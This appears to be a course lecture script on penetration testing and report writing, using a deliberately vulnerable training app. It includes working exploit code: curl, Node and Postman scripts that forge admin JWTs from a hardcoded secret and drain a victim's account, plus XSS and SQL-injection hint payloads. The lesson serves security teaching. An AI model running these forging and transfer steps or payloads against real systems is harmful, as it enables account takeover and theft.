@@ -1,0 +1,589 @@
+Script 1: VAPT (Vulnerability Assessment & Penetration Testing)
+
+The story is this: a company hires us to test the security of their banking application. We find vulnerabilities. We write a professional report. Then the company has to fix those issues and prove to an auditor that they have a working security management system in place. That's the entire industry workflow in one sentence.
+To make this real, you're not going to test some imaginary site. You're going to test ScalerBank - a deliberately vulnerable digital banking application that we've built specifically for this programme. It has a React frontend, a Node.js API, JWT authentication, money transfers, KYC, the works. And it has eighteen real, exploitable vulnerabilities that you'll find with your own hands.
+The map:
+Class 1 — Today (2 hours): VAPT
+What VAPT actually is, and why the report matters more than the hacking.
+The OWASP Top 10, CVSS scoring, and how to gather evidence.
+The structure of a professional VAPT report — the same structure you'll use for bug-bounty submissions on HackerOne, Bugcrowd, or Intigriti.
+A full live walkthrough of one critical vulnerability on ScalerBank — V-01, Hardcoded JWT Secret — using both curl and Postman, so you see both tooling styles.
+A list of the other seventeen vulnerabilities and the demo VAPT report I'll be sharing. Your homework is to find them and write your own report.
+Class 2 — Next session (2 hours): GRC & ISO 27001 Compliance
+What GRC means — Governance, Risk, and Compliance — and where it sits in the industry.
+ISO 27001:2022 — what it is, why every enterprise asks for it, and what an ISMS looks like.
+The documents an auditor expects: scope statement, risk register, Statement of Applicability, policies, treatment plans.
+We will take the same vulnerabilities we found in ScalerBank today and convert them into a GRC package — a risk register with owners, deadlines, and Annex A control mappings. This is exactly how a real GRC analyst feeds off a VAPT report.
+So Class 1 is the offensive side — find the bugs, write the report. Class 2 is the defensive and governance side — turn those findings into policies, controls, and audit evidence.
+What You Will Walk Away With (2 min)
+By the end of these two classes you will have:
+A working understanding of how a real VAPT engagement runs.
+The ability to write a finding that a developer can act on and a CISO can approve.
+A complete picture of the GRC documentation a company needs for ISO 27001 — the risk register, the SoA, the policies, the treatment plan, the tabletop scenario.
+A demo VAPT report and a demo ISO 27001 GRC report based on ScalerBank, which you can use as templates for your project submission and for your portfolio.
+What Is VAPT? (4 min)
+VAPT stands for Vulnerability Assessment and Penetration Testing. Two words, two activities.
+A Vulnerability Assessment is breadth. You walk around the application and identify weaknesses — "this header is missing," "this password policy is weak," "this endpoint reveals too much information." It's largely tool-assisted. You run Nuclei, Nessus, OpenVAS, Burp Suite scanner, and you get a list.
+A Penetration Test is depth. You take those weaknesses and you actually try to break in. You chain them together. You prove impact. "I didn't just find a hardcoded secret — I forged a token with it and transferred forty-nine thousand rupees out of a victim's account." That's a pentest finding.
+Together: VAPT.
+In the industry, most engagements are a mix — you scan broadly to find candidate weaknesses, then you exploit selectively to prove the high-impact ones. That's exactly what we'll do on ScalerBank today.
+Why the Report Matters More Than the Hacking
+Here's something most beginners miss.
+Hacking is forty percent of the job. The report is sixty percent.
+Why? Because your client is paying for the report. Let me introduce two characters who will follow us through both classes.
+Jack — the founder of ScalerBank. He's a business owner, not a technologist. He cares about three things: how bad is this, what could happen to my business, and what do I fix first.
+Bob — a security consultant from a VAPT firm. Jack has hired Bob's team to test ScalerBank before the official launch.
+Bob spends a week. He finds eighteen vulnerabilities. Now here's the moment that decides whether Bob's firm gets the renewal contract: it's not the hacking. It's the document that lands in Jack's inbox on Monday morning.
+If that document is jargon-filled, screenshots are blurry, severities are inflated, and recommendations are vague — Jack ignores it. The bugs don't get fixed. Bob never gets called back.
+If that document opens with a one-paragraph executive summary Jack can read in his car on the way to a board meeting, then has crystal-clear findings each with proof, business impact, and a one-line fix the developer can paste into a Jira ticket — that's a report that gets things done. And that's the kind of report you're going to learn to write.
+The same logic applies to bug-bounty submissions. The hunter who writes the cleanest, clearest report gets the bigger bounty — even if two other hunters submitted the same bug first.
+The VAPT Engagement Lifecycle 
+Let me walk you through how a real engagement runs, end to end.
+Scoping — Jack and Bob agree on what's in scope. ScalerBank web app, the API, maybe the mobile app. Out of scope: the corporate office network, the third-party payment gateway, anything Jack doesn't own.
+Rules of Engagement — Hours of testing, allowed payloads, escalation contacts, anti-DoS clauses. This is the legal protection for both sides.
+Reconnaissance — Bob's team maps the application. Endpoints, technologies, parameters, authentication flows. This is what you'll do in Task 1 of your ScalerBank lab.
+Vulnerability Assessment — Automated scanning. Burp, Nuclei, ZAP. Identify candidate issues.
+Penetration Testing — Manual exploitation. Confirm each issue. Chain them together where possible.
+Reporting — Draft the document. Each finding gets reviewed internally before it ships.
+Walkthrough Call — Bob's team walks Jack's developers through the findings live.
+Remediation Window — Jack's team fixes the issues.
+Retest — Bob's team confirms fixes. Closed findings get marked closed.
+Final Report — The closed-out version goes to Jack and to any external auditor.
+The whole cycle, on a small app, takes about three to four weeks. Today we're compressing the parts that matter for your learning into two hours.
+How VAPT Connects to GRC
+This is the bridge to the next class, so listen carefully.
+When Bob finds eighteen vulnerabilities in ScalerBank, those eighteen findings don't just sit in a PDF. They get fed into the company's risk register. Each finding becomes one or more risks. Each risk gets an owner, a deadline, and a treatment plan. Each treatment plan gets mapped to an ISO 27001 Annex A control.
+So V-01, the hardcoded JWT secret we're about to exploit today — in Class 2 it becomes risk R-001 in ScalerBank's risk register, mapped to ISO controls A.5.17 (Authentication Information), A.8.5 (Secure Authentication), and A.8.24 (Use of Cryptography), with the AppSec Lead as the owner and a fixed deadline.
+That's the loop. VAPT is the eyes. GRC is the brain that decides what to do with what the eyes saw.
+🎤 Quick Question: "If a pentester finds the same SQL injection bug in twenty different companies, why is the impact of that bug different in each report?"
+Exactly. The bug is the same. The impact is what your client cares about. A SQL injection on a public marketing page is annoying. The same SQL injection on a banking application is a regulatory incident. That's why every finding in a good report has a business impact paragraph — not just a CVSS score.
+OWASP Top 10 — The Vocabulary of Web Security
+Before we talk about findings, you need to know the vocabulary. OWASP — the Open Web Application Security Project — publishes a list of the ten most common and dangerous web vulnerabilities. Every security professional knows it by heart. So will you, by the end of this programme.
+Let me give you the short version, with quick examples from ScalerBank where they apply.
+A01 — Broken Access Control. Users accessing data they shouldn't. On ScalerBank, this would be IDOR — trying to read someone else's account by changing a UUID. We tested it — ScalerBank actually got this one right; the API returns 404. We'll mention this as a positive control in the report.
+A02 — Cryptographic Failures. Bad use of crypto, missing encryption, hardcoded keys. This is V-01 on ScalerBank — the hardcoded JWT secret we'll exploit in Part 5.
+A03 — Injection. SQL injection, command injection, NoSQL injection. ScalerBank has a latent SQL interpolation pattern (V-17) — not exploitable today, but a future foot-gun.
+A04 — Insecure Design. Bigger picture flaws — no transfer limits, no MFA enforcement, no rate limiting. ScalerBank has all three (V-06, V-11, V-12).
+A05 — Security Misconfiguration. Wide-open CORS, missing security headers, debug mode in production. ScalerBank's CORS is set to * (V-02). Helmet is not installed (V-14).
+A06 — Vulnerable and Outdated Components. Old library versions with known CVEs. You'd find these by running npm audit.
+A07 — Identification and Authentication Failures. Weak passwords, broken session handling, no rate limit on login. ScalerBank fails here too — V-06, V-10, V-11.
+A08 — Software and Data Integrity Failures. Trusting unsigned updates, unsigned tokens, insecure deserialization.
+A09 — Security Logging and Monitoring Failures. No audit logs, no IP capture, no SIEM forwarding. ScalerBank's audit logs are sparse (V-16).
+A10 — Server-Side Request Forgery (SSRF). The server makes a request on the attacker's behalf to an internal resource.
+Notice something? Just from this one application, we hit seven of the ten OWASP categories. That's why this list matters — it gives you the buckets to file your findings under.
+CVSS — How We Rate Severity
+When Bob writes a finding, he can't just say "this is bad." He needs a defensible, mathematical score. That's CVSS — Common Vulnerability Scoring System. Score from 0.0 to 10.0.
+[Board: draw the scale]
+Score
+Severity
+What It Means
+9.0 – 10.0
+Critical
+Fix now. Drop everything.
+7.0 – 8.9
+High
+Fix in days.
+4.0 – 6.9
+Medium
+Fix in the next sprint.
+0.1 – 3.9
+Low
+Fix when convenient, don't ignore.
+
+The score is built from a vector string that captures the attack surface. For V-01 on ScalerBank, the vector is:
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+
+Decoded:
+AV:N — Attack Vector: Network. Exploitable over the internet.
+AC:L — Attack Complexity: Low. No special conditions needed.
+PR:N — Privileges Required: None. Attacker doesn't need an account.
+UI:N — User Interaction: None. No phishing needed.
+S:U — Scope: Unchanged.
+C:H / I:H / A:N — High Confidentiality and Integrity impact, no Availability impact.
+That math gives 9.1 — Critical for the base score. We rate it High in the report because the role escalation path (V-04) isn't activated today, but the base CVSS is already 9.1. You always justify your number with the vector. Never just write "High" and walk away.
+Tip: Use the official FIRST.org CVSS calculator — https://www.first.org/cvss/calculator/3.1 — and screenshot the result for your evidence appendix.
+Evidence — The Thing That Makes Findings Stick
+A finding without evidence is just an opinion. A finding with evidence is something the developer has to fix.
+For every finding you submit — VAPT or bug-bounty — you must have:
+Request and response captures. Either curl outputs, or Burp Suite request/response pairs, or Postman collection snippets. Show the exact bytes.
+Reproduction steps. Numbered. Anyone with a clean account should be able to follow them and reproduce.
+Screenshots with annotations. Highlight the interesting field. Don't just dump a screenshot — circle what matters.
+PII redacted. If you captured real user data in test traffic, blur names, emails, account numbers. Both professional and legally necessary.
+A clear PoC payload. The exact token, the exact curl command, the exact body — copy-pasteable. The developer should be able to paste it into their terminal and reproduce in fifteen seconds.
+If a developer can't reproduce your bug in fifteen seconds, the bug doesn't get fixed. That's the rule.
+Anatomy of a Good VAPT / Bug-Bounty Report 
+Report Structure — Section by Section
+Let me walk you through the structure I want you to use for the ScalerBank project. This same structure works for bug bounties — just trim sections you don't need.
+[Board: write each section as you describe it]
+1. Cover Page
+Client name, report title, version (v1.0), date range of testing, consultant firm name, classification ("CONFIDENTIAL"). It's just the first impression — but a board member might open it. Make it look professional.
+2. Scope
+What you tested. What you did not test. Testing window. Type (black-box / grey-box / white-box). Authenticated or unauthenticated.
+For ScalerBank our scope is:
+In scope: https://devops-scalerbank.onrender.com, all /api/* endpoints, the React frontend
+Out of scope: Third-party services, the hosting platform (Render), denial-of-service attacks
+Type: Grey-box (we have a test account; we don't have direct DB access)
+Window: 21–29 April 2026
+3. Executive Summary
+One page. No jargon. This is the page Jack reads.
+"We tested the ScalerBank digital banking application between 21st and 29th April 2026. We identified 18 vulnerabilities — 6 High, 8 Medium, 3 Low, 1 Informational. Two High findings — a hardcoded authentication key and absent money-transfer limits — are independently exploitable to achieve full account takeover and large-scale unauthorized fund movement respectively. We recommend immediate remediation of all High findings before the production launch."
+That's it. Three sentences.  Jack now knows everything he needs to make a decision.
+4. Methodology
+Frameworks you followed — OWASP Testing Guide, OWASP ASVS, NIST SP 800-115, PTES. Tools you used — Burp Suite, curl, Postman, Nuclei, Node.js for token forging. Helps the auditor calibrate your work.
+5. Findings Summary Table
+A grid: ID, Title, Severity, Affected Asset, Status (Open/Closed). The developer scans this first to prioritise.
+6. Detailed Findings
+One section per vulnerability. We'll cover the template in detail next.
+7. Risk Heatmap
+A 5×5 grid — likelihood × impact — that visualises where the bulk of risk sits. Nice for executives.
+8. Recommendations Summary
+A prioritised list of the top fixes. Helps engineering plan the sprint.
+9. Appendices
+Tool output dumps (Burp logs, Nuclei JSON).
+Full curl command set.
+Postman collection export.
+CVSS calculator screenshots.
+The Finding Template
+Every finding follows the same shape. Memorise this — it's your career muscle memory.
+ID: SB-VAPT-001 
+Title: Hardcoded fallback JWT secret 
+Severity: High (CVSSv3.1: 9.1) 
+CVSS Vector:AV:N/AC:L/PR:N/UI:N/... 
+OWASP Top 10: A02 Cryptographic Failures 
+CWE: CWE-798, CWE-321 
+Affected:backend/middleware/auth.js
+Description <plain-English explanation of the issue>
+Steps to Reproduce
+...
+...
+...
+Proof of Concept <curl / Postman / payload>
+Business Impact <what could go wrong, in business terms>
+Remediation <specific, actionable fix>
+References <CWE link, OWASP link, RFC link>
+A few rules I want you to internalise:
+Title is short and descriptive. "Hardcoded fallback JWT secret" — not "JWT problem."
+Description is two to four sentences. Plain English, no jargon dump.
+Steps to reproduce are numbered and self-contained. Anyone can follow them with a fresh account.
+Business impact is in money/regulatory/reputational terms. "Direct customer fund loss" beats "could affect users."
+Remediation is specific. Not "improve security." Write the actual code change.
+Now let's put that template to work.
+LIVE PRACTICAL: V-01 Hardcoded JWT Secret on ScalerBank
+Setup: 
+#  git clone https://github.com/vilasvarghese/DevOps_ScalerBank
+# cd DevOps_ScalerBank/backend/
+# sudo apt update -y && sudo apt install npm -y
+# npm install
+# cd ../frontend && npm install
+# cd ../backend
+# node server.js
+# cd frontend
+# npx vite
+
+
+Set the Stage
+Alright, this is the main event of today's class. We're going to do an end-to-end exploit of one vulnerability on ScalerBank — V-01, Hardcoded JWT Secret — using two different tools so you see both workflows.
+First pass — curl. Old-school, scriptable, the language of every Linux command line.
+Second pass — Postman. GUI, beginner-friendly, the tool most enterprise API teams use.
+The vulnerability is in backend/middleware/auth.js. The JWT library uses this line:
+const JWT_SECRET = process.env.JWT_SECRET || 'scalerbank_secret_key_2026';
+
+If the environment variable isn't set — and in the repo default, it isn't — the application falls back to the literal string scalerbank_secret_key_2026. That means anyone who reads the source code (which is public, since the repo is shipped to students) can forge a JWT for any user. Including the role of admin.
+This is a Critical-class vulnerability. CVSS 9.1. We're going to prove it.
+🎤 Quick check: "Before we start — what's the business impact of being able to forge any user's JWT on a banking app? Shout it out." [Expected answers: account takeover, money theft, PII exposure, regulatory breach. All correct.]
+Step 0 — Environment Setup
+Open your terminal. We're going to set one variable so we don't have to retype the base URL every time.
+export BASE=https://devops-scalerbank.onrender.com
+# Or for the local lab:
+# export BASE=http://localhost:3001
+
+Verify the API is alive:
+curl -s "$BASE/api/health" | jq .
+
+You should see something like {"status":"ok"}. If you do — good, we're in.
+Step 1 — Create a Victim Account (curl)
+We need a victim. In a real engagement you wouldn't attack random users — you'd create your own test accounts. Bob always creates two: a victim, and an attacker.
+Register the victim:
+curl -s -X POST "$BASE/api/auth/register" \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "email": "victim@scaler.test",
+    "password": "Hunter2hunter2",
+    "firstName": "Vicky",
+    "lastName": "Tim",
+    "phone": "9999999999"
+  }' | tee /tmp/victim.json
+
+Save the token and user ID:
+export VTOKEN=$(jq -r .token /tmp/victim.json)
+export VUID=$(jq -r .user.id /tmp/victim.json)
+
+echo "Victim token: $VTOKEN"
+echo "Victim UUID:  $VUID"
+
+Now register the attacker (Mallory — the classic attacker name in security textbooks):
+curl -s -X POST "$BASE/api/auth/register" \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "email": "mallory@scaler.test",
+    "password": "AttackerPass123!",
+    "firstName": "Mal",
+    "lastName": "Lory"
+  }' | tee /tmp/mal.json
+
+export ATOKEN=$(jq -r .token /tmp/mal.json)
+export AUID=$(jq -r .user.id /tmp/mal.json)
+
+Two accounts. Two tokens. Now let's look inside one of them.
+Step 2 — Decode the JWT (3 min)
+A JWT has three parts separated by dots: header, payload, signature.
+echo "$VTOKEN" | awk -F. '{print $1}' | base64 -d
+# {"alg":"HS256","typ":"JWT"}
+
+echo "$VTOKEN" | awk -F. '{print $2}' | base64 -d
+# {"id":"<uuid>","email":"victim@scaler.test","role":"customer","iat":...,"exp":...}
+
+Two things to notice:
+The algorithm is HS256 — HMAC with SHA-256. That means there's a single shared secret used both to sign and verify. If we know that secret, we can sign our own tokens.
+The payload includes a role claim that says customer. If we forge a token with role: 'admin', the server will trust it — there's no second check.
+That's the vulnerability in two observations. Now let's exploit it.
+Step 3 — Forge a Token (curl + Node) (5 min)
+We're going to use Node.js with the jsonwebtoken library — the same library ScalerBank itself uses. Same library, same algorithm, same secret. The forged token is mathematically indistinguishable from a real one.
+FORGED=$(node -e "console.log(require('jsonwebtoken').sign({
+  id:    '$VUID',
+  email: 'victim@scaler.test',
+  role:  'admin'
+}, 'scalerbank_secret_key_2026', { expiresIn: '7d' }))")
+
+echo "Forged token:"
+echo "$FORGED"
+
+We just signed a token that says: "I am the victim. My role is admin. I am valid for seven days." And we never typed the victim's password.
+Pause and absorb this for a moment. We have not bypassed any security check. We have not exploited a memory bug. We have not phished anyone. We read one string from the source code, called one library function, and now we are the victim.
+Step 4 — Use the Forged Token (curl) (4 min)
+Let's prove the server accepts our forgery.
+Read the victim's profile:
+curl -s -H "Authorization: Bearer $FORGED" "$BASE/api/auth/profile" | jq .
+
+You should see Vicky Tim's full profile — name, email, phone, KYC fields if set. The server has handed us the victim's data because the signature checks out.
+List the victim's accounts:
+curl -s -H "Authorization: Bearer $FORGED" "$BASE/api/accounts" | jq '.[] | {id, account_number, currency, balance}'
+
+You'll see the victim's INR savings account, balance, account number. Everything an attacker needs to plan a fraudulent transfer.
+Step 5 — Drain the Victim's Account (curl) (5 min)
+This is the moment of impact. We're going to move money from Vicky's account into Mallory's. In a real engagement, this is what convinces the CFO that the vulnerability is real.
+Get the source (victim's INR account ID) and destination (attacker's INR account number):
+VFROM=$(curl -s -H "Authorization: Bearer $FORGED" "$BASE/api/accounts" \
+  | jq -r '.[] | select(.currency=="INR") | .id')
+
+ATO=$(curl -s -H "Authorization: Bearer $ATOKEN" "$BASE/api/accounts" \
+  | jq -r '.[] | select(.currency=="INR") | .account_number')
+
+echo "From account ID:    $VFROM"
+echo "To account number:  $ATO"
+
+Now execute the transfer:
+curl -s -X POST "$BASE/api/transactions/transfer" \
+  -H "Authorization: Bearer $FORGED" \
+  -H 'Content-Type: application/json' \
+  -d "{
+    \"fromAccountId\":   \"$VFROM\",
+    \"toAccountNumber\": \"$ATO\",
+    \"amount\":          49000,
+    \"description\":     \"refund\"
+  }" | jq .
+
+Expected response:
+{ "transactionId": "...", "status": "completed", "balance": <small remainder> }
+
+INR 49,000 just moved from Vicky to Mallory. The transaction is logged under Vicky's user ID because that's what the forged token claims. To the audit log, this looks like a legitimate transfer that Vicky initiated.
+That is the full impact. We're done with the curl portion. Now let's redo this in Postman so you have both tools in your belt.
+Step 6 — Same Attack in Postman (12 min)
+Postman is the GUI counterpart to curl. Most enterprise API teams live in Postman. For your VAPT report, attaching a Postman collection is often more useful than attaching curl commands, because the reviewer can click "Send" and reproduce the bug instantly.
+Setting Up a Postman Environment (2 min)
+Open Postman. Top-right → Environments → +. Create one called ScalerBank-Lab. Add the following variables:
+Variable
+Initial Value
+BASE
+http://<IP_ADDRESS>:5173/
+VTOKEN
+(empty for now)
+VUID
+(empty for now)
+ATO 
+
+VFROM
+
+ATOKEN
+(empty for now)
+
+(empty for now)
+
+
+(empty for now)
+FORGED
+(empty for now)
+
+Select the environment in the top-right dropdown.
+Request 1 — Register Victim (2 min)
+Method: POST
+URL: {{BASE}}/api/auth/register
+Headers: Content-Type: application/json
+Body (raw, JSON):
+{
+  "email": "victim2@scaler.test",
+  "password": "Hunter2hunter2",
+  "firstName": "Vicky",
+  "lastName": "Tim",
+  "phone": "9999999999"
+}
+
+In the Scripts tab — this is where Postman shines — paste the below in Post-request-:
+const json = pm.response.json();
+pm.environment.set("VTOKEN", json.token);
+pm.environment.set("VUID",   json.user.id);
+console.log("Saved VTOKEN and VUID");
+
+Click Send. The Tests script automatically pulls the token and UUID from the response and stores them in your environment. No copy-paste, no errors.
+Request 2 — Register Attacker (1 min)
+Duplicate the request, change the email to mallory2@scaler.test, and change the Tests script to save into ATOKEN:
+const json = pm.response.json();
+pm.environment.set("ATOKEN", json.token);
+console.log("Saved ATOKEN");
+
+Send.
+Request 3 — Forge the Token (Pre-request Script) (4 min)
+This is the cool part. Postman has a Pre-request Script tab where you can run JavaScript before the request fires. We'll use that to forge the JWT inline.
+Postman bundles CryptoJS natively. We'll write a small HMAC-SHA256 JWT signer by hand. Create a new request:
+Method: GET
+URL: {{BASE}}/api/auth/profile
+Headers: Authorization: Bearer {{FORGED}}
+In the Pre-request Script tab:
+// Minimal HS256 JWT forger using CryptoJS (bundled in Postman)
+const CryptoJS = require('crypto-js');
+
+const base64url = (str) =>
+  CryptoJS.enc.Utf8.parse(str)
+    .toString(CryptoJS.enc.Base64)
+    .replace(/=+$/, '')
+    .replace(/\+/g, '-')
+    .replace(/\//g, '_');
+
+const base64urlFromWordArray = (wa) =>
+  wa.toString(CryptoJS.enc.Base64)
+    .replace(/=+$/, '')
+    .replace(/\+/g, '-')
+    .replace(/\//g, '_');
+
+const header = { alg: "HS256", typ: "JWT" };
+
+const now = Math.floor(Date.now() / 1000);
+const payload = {
+  id:    pm.environment.get("VUID"),
+  email: "victim2@scaler.test",
+  role:  "admin",
+  iat:   now,
+  exp:   now + 7 * 24 * 3600
+};
+
+const SECRET = "scalerbank_secret_key_2026";
+
+const encHeader  = base64url(JSON.stringify(header));
+const encPayload = base64url(JSON.stringify(payload));
+
+const signature  = CryptoJS.HmacSHA256(`${encHeader}.${encPayload}`, SECRET);
+const encSig     = base64urlFromWordArray(signature);
+
+const token = `${encHeader}.${encPayload}.${encSig}`;
+pm.environment.set("FORGED", token);
+
+console.log("Forged token:", token);
+
+Click Send. The pre-request script runs first, forges the token, stores it in FORGED, and then the actual GET request uses that token. The response should be Vicky's profile.
+Request 4 — Get Victim's INR Account ID (1 min)
+Method: GET
+URL: {{BASE}}/api/accounts
+Headers: Authorization: Bearer {{FORGED}}
+Tests tab:
+const inr = pm.response.json().find(a => a.currency === "INR");
+pm.environment.set("VFROM", inr.id);
+
+Request 5 — Get Attacker's INR Account Number (1 min)
+Method: GET
+URL: {{BASE}}/api/accounts
+Headers: Authorization: Bearer {{ATOKEN}}
+Tests tab:
+const inr = pm.response.json().find(a => a.currency === "INR");
+pm.environment.set("ATO", inr.account_number);
+
+Request 6 — The Transfer (1 min)
+Method: POST
+URL: {{BASE}}/api/transactions/transfer
+Headers: Authorization: Bearer {{FORGED}}, Content-Type: application/json
+Body:
+{
+  "fromAccountId":   "{{VFROM}}",
+  "toAccountNumber": "{{ATO}}",
+  "amount":          49000,
+  "description":     "refund"
+}
+
+Send. You should see the same "status":"completed" response.
+You've now reproduced the full attack chain in a click-Send-six-times Postman collection. Export this collection (top-right of the collection → ⋯ → Export) and attach it as Appendix A of your VAPT report. Anyone — developer, auditor, manager — can now reproduce your finding in under thirty seconds.
+Step 7 — Wrap This Into a Finding
+Open your VAPT report template and start filling in V-01:
+ID:               SB-VAPT-001
+Title:            Hardcoded fallback JWT signing secret
+Severity:         High (CVSSv3.1: 9.1 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
+OWASP Top 10:     A02 Cryptographic Failures, A07 Identification & Authentication Failures
+CWE:              CWE-798 Use of Hard-coded Credentials, CWE-321 Use of Hard-coded Cryptographic Key
+Affected:         backend/middleware/auth.js:2 — all JWT-protected endpoints
+
+Description:
+The JWT signing key falls back to the literal string 'scalerbank_secret_key_2026'
+when the JWT_SECRET environment variable is unset, which is the deployment default.
+HMAC-SHA256 with a known key allows any third party to forge access tokens with
+arbitrary id, email, and role claims. Combined with the absence of server-side role
+re-validation (V-04), forged role: 'admin' tokens would yield full administrative
+access on any future admin route.
+
+Steps to Reproduce:
+1. Register a victim account via POST /api/auth/register; record user.id.
+2. Forge a token: node -e "console.log(require('jsonwebtoken').sign({
+     id:'<victim-uuid>', email:'victim@scaler.test', role:'admin'
+   }, 'scalerbank_secret_key_2026', { expiresIn:'7d' }))"
+3. GET /api/auth/profile with Authorization: Bearer <forged> returns the victim's profile.
+4. POST /api/transactions/transfer with the same token successfully debits the victim's account.
+
+Proof of Concept:
+See Appendix A — Postman collection 'ScalerBank-V01.postman_collection.json'.
+See Appendix B — full curl session transcript.
+Screenshot: response of successful INR 49,000 transfer (Figure 1).
+
+Business Impact:
+- Direct customer fund loss via unauthorised transfers and bill payments.
+- Wholesale customer PII / KYC exposure when chained with V-09 (profile over-share).
+- Regulatory exposure under the DPDP Act (India) and RBI digital banking guidelines.
+- Reputational damage; potential regulator-mandated breach disclosure.
+
+Remediation:
+1. Rotate the signing secret immediately. Generate 32+ bytes of entropy and store
+   in a secrets manager (AWS Secrets Manager, HashiCorp Vault). Remove the fallback literal.
+2. Fail closed on absence: throw at boot if JWT_SECRET is unset or shorter than 32 chars.
+3. Pin algorithm, issuer, and audience on jwt.verify().
+4. Migrate to RS256 / EdDSA — asymmetric signing — so verifying services never hold the signing key.
+5. Add a SAST rule (Semgrep, gitleaks) that fails CI if the pattern
+   `process.env.\w+\s*\|\|\s*['"]` appears in source.
+
+References:
+- OWASP ASVS v4 §2.10, §3.5
+- NIST SP 800-63B §5.1.5
+- RFC 7519 §11 (JWT), RFC 8725 (JWT BCP)
+- CWE-798, CWE-321
+
+That is a senior-level finding. Not because of the hacking — because every section is tight, factual, and actionable.
+Step 8 — Cleanup (3 min)
+In a real engagement, always:
+Delete test users you created.
+Reverse any test transfers (or notify the client that you didn't, with timestamps).
+Hand back any tokens and credentials.
+Confirm in writing that you've stopped testing.
+For ScalerBank these test users live in a sandbox, so we don't need to worry — but in production, this discipline matters. Forgetting to clean up has ended consulting contracts.
+Self-Practice & Wrap-Up
+What You'll Find on Your Own
+I showed you V-01 in detail. ScalerBank has seventeen more vulnerabilities. Your project deliverable is to find them, exploit them, and document each one to the same standard you saw today. Here's the list — please confirm each one is present and write a finding for it.
+ID
+Title
+Severity
+Hint
+V-01
+Hardcoded JWT Secret
+High
+Done together today
+V-02
+Open CORS (Access-Control-Allow-Origin: *)
+High
+curl -i -H 'Origin: https://evil.example' "$BASE/api/health"
+V-03
+JWT stored in localStorage
+Medium
+DevTools → Application → Local Storage
+V-04
+Self-asserted role in token
+High
+grep -rn 'req.user.role' backend/ returns nothing
+V-05
+Long-lived tokens, no server-side revocation
+Medium
+Token works after logout
+V-06
+No rate limiting on login
+High
+Loop 200 login attempts; no 429
+V-07
+KYC PII stored in plaintext
+High
+POST /api/auth/kyc with "NOT-A-REAL-ID" succeeds
+V-08
+Stored unsanitised input
+Medium
+Transfer with description: "<img src=x onerror=alert(1)>"
+V-09
+Profile over-share
+Medium
+GET /api/auth/profile returns Aadhaar, PAN, role, etc.
+V-10
+Weak password policy
+Medium
+Register with password "a" succeeds
+V-11
+MFA toggle without enforcement
+Medium
+Toggle MFA on, log out, log in with password only
+V-12
+No transfer limits
+High
+Transfer amount: 1e308 accepted
+V-13
+SQLite DB committed to repo
+Medium → High
+git ls-files | grep '.db$'
+V-14
+Missing security headers
+Medium
+No CSP, no HSTS, no X-Frame-Options
+V-15
+Verbose error logging
+Low
+Errors leak stack traces
+V-16
+Audit logs missing IP / UA / integrity chain
+Low
+GET /api/audit
+V-17
+SQL string interpolation pattern
+Informational
+?days=30;DROP%20TABLE%20users-- returns normal data
+V-18
+No application-layer HTTPS enforcement
+Medium
+Request via HTTP succeeds
+
+I'll share the demo VAPT report with you on Discord — V-01 through V-18 all written out at full standard. Use it as a reference for tone and depth. Do not copy-paste it. Every finding you submit should have your own PoC output and your own evidence. Plagiarism checks are real, and the point of the project is your own hands-on time.
+Common Mistakes I'll Be Marking Down
+Let me save you the marks I see beginners lose every cohort:
+Inflating severity. A missing X-Content-Type-Options header is Low. If you mark it High, you lose credibility on the entire report.
+Tiny, unreadable screenshots. Use a screenshot tool with annotations. Highlight the interesting field.
+No business impact. "SQL injection found." So what? Translate it: "An attacker could extract the entire customer database, exposing 50,000 records of names, emails, and hashed passwords, leading to DPDP Act penalties."
+AI-generated descriptions. I can spot them. They're generic, don't match the specific asset, and recommend textbook fixes that don't apply. Write your own.
+No reproduction steps. If the developer can't reproduce it, the bug doesn't get fixed.
+Forgetting positive controls. Stronger reports also note what's correct — like the fact that ScalerBank's IDOR protection on /api/accounts/:id actually works. That signals methodical testing.
+What Comes Next
+Class 2 is the GRC and ISO 27001 side. We'll take the same eighteen findings — the ones you just learned to exploit — and convert them into:
+A risk register with risk IDs, likelihood × impact scoring, owners, deadlines, and treatment plans.
+A Statement of Applicability mapping each risk to ISO 27001:2022 Annex A controls.
+Sample policies — secure token handling, CORS, PII protection, incident response.
+A tabletop incident scenario based on the V-01 attack we just performed today.
+That's the loop that turns a pentester into a security program. Today you broke ScalerBank. Next class you build the system that prevents — or detects — what you just did.
+Bring your VAPT report draft to the next class. We'll review it live.
+
